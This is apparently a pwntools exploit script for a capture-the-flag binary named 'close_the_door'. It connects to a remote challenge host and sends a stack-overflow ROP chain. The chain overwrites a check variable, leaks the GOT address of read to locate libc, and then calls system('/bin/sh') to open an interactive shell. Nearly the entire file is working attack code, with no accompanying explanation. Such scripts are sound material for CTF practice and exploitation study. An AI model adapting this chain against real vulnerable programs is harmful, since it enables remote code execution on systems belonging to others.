from pwn import *

exe = './close_the_door'
context.binary = exe

elf = ELF(exe)

    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    No canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)

# p = process(exe)
# libc = ELF('./libc.self')

p = remote('178.62.14.240', 30777)
libc = ELF('./libc.so.6')

p.sendlineafter('> ', b'flag.txt\x00') # companion?

p.sendlineafter('> ', '42')

# return address at 72
# offset 36 -> rdx

# 40 is offset of rsi for write
# 36 is offset of rdx for write

def ropchain(rsiwrite, rdxlength, arr):
    prep = {
        36: p32(rdxlength),
        40: rsiwrite
    }
    index = 72
    for addr in arr:
        prep[index] = addr
        index += 8
    return flat(prep)

POP_RDI = 0x0000000000400b53 #: pop rdi ; ret
POP_RSI_R15 = 0x0000000000400b51 #: pop rsi ; pop r15 ; ret
PCT_D_FORMAT = 0x00400c92 # the string %d

#maybe use scanf to overwrite the check variable
# payload = ropchain(elf.got['read'], 0x8, [POP_RDI, PCT_D_FORMAT, POP_RSI_R15, elf.sym['check'], 0, elf.plt['__isoc99_scanf'], elf.sym['hidden_func']])
payload = ropchain(elf.got['read'], 0x8, [POP_RDI, 0, POP_RSI_R15, elf.sym['check'], 0, elf.plt['read'], POP_RDI, 1, elf.sym['hidden_func']])


# gdb.attach(p, gdbscript=f"""
# b read
# b exit
# b hidden_func
# c
# """)

# b * 0x00400908
# b * 0x004008b8
# gdb.attach(p, gdbscript=f"""
# b * 0x00400814
# b * write
# b __isoc99_scanf
# c
# """)

p.sendlineafter('> ', payload)
sleep(1)
# gdb.attach(p, gdbscript='c')
# p.sendline('0') #overwrite check with 0
# input()
p.send(p64(0))
sleep(1)
leak = p.recv(timeout=0.5)
GOT_READ = int.from_bytes(leak[:8], 'little')
libc.address = GOT_READ - libc.sym['read']
log.info(f"Libc @ {hex(libc.address)}")
print(leak)

BIN_SH = next(libc.search(b'/bin/sh\x00'))

payload = ropchain(elf.got['write'], 0x8, [POP_RDI, BIN_SH, libc.sym['system'], elf.sym['hidden_func']])
p.sendline(payload)

p.interactive()
